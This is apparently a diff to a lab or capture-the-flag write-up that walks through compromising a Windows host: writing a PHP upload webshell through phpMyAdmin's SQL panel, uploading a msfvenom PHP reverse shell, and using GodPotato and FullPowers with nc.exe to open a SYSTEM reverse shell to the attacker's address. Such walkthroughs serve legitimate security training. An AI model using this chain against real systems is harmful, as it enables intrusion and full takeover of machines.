@@ -62,7 +62,13 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 56.46 seconds
 ```
 
-We use FoxyProxy to access `http://192.168.53.189:8080`. It shows a PHPMyAdmin control panel.
+# Non-SYSTEM access
+
+We use FoxyProxy to access `http://192.168.53.189:8080`.
+
+![](Pasted%20image%2020260403144759.png)
+
+It shows a PHPMyAdmin control panel.
 
 ![](Pasted%20image%2020260403144140.png)
 
@@ -78,11 +84,87 @@ We also go to `phpinfo` page and see the document root is `C:\wamp\www\`.
 
 We then go to "SQL" panel in PHPMyAdmin, where we set up an upload utility and a reverse shell.
 
+```sh
+msfvenom -p php/reverse_php LHOST=192.168.49.53 LPORT=4444 -f raw > shell.php
 ```
 
+![](Pasted%20image%2020260403144537.png)
 
+We create the upload utility file.
+
+```sql
+SELECT   
+"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"  
+INTO OUTFILE 'C:/wamp/www/uploader.php';
+```
+
+![](Pasted%20image%2020260403144605.png)
+
+We upload our reverse shell.
+
+![](Pasted%20image%2020260403144650.png)
+
+We start a `nc` listener on port `4444` to get non-root access.
 
 ```
-# Non-SYSTEM access
+nc -nvlp 4444
+```
+
+We visit `http://192.168.53.189:8080/shell.php` to trigger a connection to the attacker.
+
+![](Pasted%20image%2020260403144900.png)
 
 # SYSTEM access
+
+We query the dotnet version.
+
+```sh
+# on victim, to find .net version
+reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP" /s
+```
+
+![](Pasted%20image%2020260403145021.png)
+
+It is Dotnet `4.x`.
+
+We go back to our `uploader.php` page and upload a few useful binaries:
+
+```sh
+# on attacker, then upload
+wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
+cp GodPotato-NET4.exe GodPotato.exe
+file GodPotato.exe
+
+wget https://github.com/itm4n/FullPowers/releases/download/v0.1/FullPowers.exe
+file FullPowers.exe
+
+wget https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc.exe
+file nc.exe
+```
+
+![](Pasted%20image%2020260403145118.png)
+
+We go back to our victim reverse shell. We note the binaries exist.
+
+![](Pasted%20image%2020260403145205.png)
+
+We start a new reverse shell listener on the attacker at port `5555`.
+
+```
+nc -nvlp 5555
+```
+
+We run this on the victim:
+
+```
+copy C:\wamp\www\nc.exe C:\Windows\Temp\nc.exe
+FullPowers.exe
+GodPotato.exe -cmd "C:\Windows\Temp\nc.exe 192.168.49.53 5555 -e cmd.exe"
+```
+
+![](Pasted%20image%2020260403145435.png)
+
+And our second reverse shell now has SYSTEM access.
+
+![](Pasted%20image%2020260403145507.png)
+
